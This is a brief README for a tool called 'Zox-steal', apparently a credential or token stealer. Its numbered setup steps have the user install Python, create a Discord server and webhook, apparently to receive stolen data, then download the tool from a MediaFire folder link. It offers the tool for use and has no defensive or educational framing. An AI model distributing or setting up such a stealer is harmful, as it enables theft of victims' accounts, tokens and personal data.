# Zox-steal
1.install python on pc
2.create a server discord
3.create webhook
4.https://www.mediafire.com/folder/5vsnlvh3azf9r/Zox-Steal-main
5.Enjoy!